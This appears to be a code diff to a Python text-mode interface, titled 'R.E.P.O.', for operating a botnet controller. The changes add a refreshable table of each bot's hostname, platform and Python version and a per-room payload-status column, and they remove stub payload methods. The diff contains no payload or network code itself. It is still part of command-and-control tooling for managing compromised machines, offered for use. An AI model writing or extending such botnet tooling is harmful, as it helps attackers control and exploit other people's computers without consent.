@@ -1,11 +1,11 @@
-import time
-from botnetController import BotnetController
+
+from botnetController import BotnetController, CommandRoom
 from rich.console import Console
 from rich.table import Table
 from rich.prompt import Prompt, Confirm
 from rich.panel import Panel
 from rich.align import Align
-from rich.layout import Layout
+from rich.live import Live
 import pyfiglet  
 
 class BotnetGUI:
@@ -17,16 +17,6 @@ class BotnetGUI:
     def print_ascii_title(self):
         ascii_title = pyfiglet.figlet_format("R.E.P.O.", font="slant")
         self.console.print(Align.center(ascii_title))
-
-
-    def start_payload(self):
-        pass
-
-    def stop_payload(self):
-        pass
-
-    def custom_command(self):
-        pass
 
     def send_command(self):
         try:
@@ -111,21 +101,35 @@ class BotnetGUI:
         except Exception as e:
             self.console.print(f"[bold red]Error:[/] {str(e)}")
             
-    def show_bot_status_in_room(self, room):
-        self.console.clear()
-        self.console.print(Align.center(Panel(f"[bold green]Bots in Room: {room.room.name}[/]", expand=True)))
+    def show_bot_status_in_room(self, room: CommandRoom):
+        while True:
+            self.console.clear()
+            self.console.print(Align.center(Panel(f"[bold green]Bots in Room: {room.room.name}[/]", expand=True)))
 
-        bot_table = Table()
-        bot_table.add_column("Bot ID", style="bold cyan")
-        bot_table.add_column("Status", justify="center", style="bold white")
+            bot_table = Table()
+            bot_table.add_column("Bot ID", style="bold cyan")
+            bot_table.add_column("Hostname", style="bold cyan")
+            bot_table.add_column("Platform", style="bold cyan")
+            bot_table.add_column("Platform Version", style="bold cyan")
+            bot_table.add_column("Machine", style="bold cyan")
+            bot_table.add_column("Python Version", style="bold cyan")
+            
 
-        # TODO: now uses pinging status, but should use payload status 
-        for id, (bot, status) in room.bots.items():
-            status = "[bold green]● Active[/]" if status else "[bold red]● Inactive[/]"
-            bot_table.add_row(bot.hostname, status)
-
-        self.console.print(Align.center(bot_table))
-        Prompt.ask("[bold white]Press Enter to return to the main menu...")
+            for bot_id, [bot, _] in room.bots.items():
+                bot_table.add_row(
+                    bot_id, 
+                    bot.hostname,
+                    bot.platform,
+                    bot.platform_version,
+                    bot.machine,
+                    bot.python_version
+                )
+            self.console.print(Align.center(bot_table))
+            refresh = Prompt.ask("[bold white]Press Enter to return to the main menu...(r to refresh)", choices=["", 'r'])
+            if refresh == "r":
+                continue
+            else:
+                return
 
     def show_state(self):
         try:
@@ -135,13 +139,15 @@ class BotnetGUI:
             table = Table()
             table.add_column("Room Name", style="bold cyan")
             table.add_column("Bot Count", justify="center", style="bold magenta")
+            table.add_column("Payload Status", justify="center")
             
             total_bots = 0
             room_list = list(self.controller.command_rooms.items())
             for _, room in room_list:
                 bot_count = len(room.bots)
                 total_bots += bot_count
-                table.add_row(room.room.name[len(self.commandroom_prefix):], str(bot_count))
+                status = "[bold green]● Active[/]" if room.payload_status else "[bold red]● Inactive[/]"
+                table.add_row(room.room.name[len(self.commandroom_prefix):], str(bot_count), status)
             
             self.console.print(Align.center(table))
             self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")
@@ -217,7 +223,7 @@ class BotnetGUI:
                     case "5":
                         self.console.print("[bold red]Exiting...[/]")
                         break
-                    
+
                     case _:
                         self.console.print("[bold red]Invalid option! Try again.[/]")
             except Exception as e:
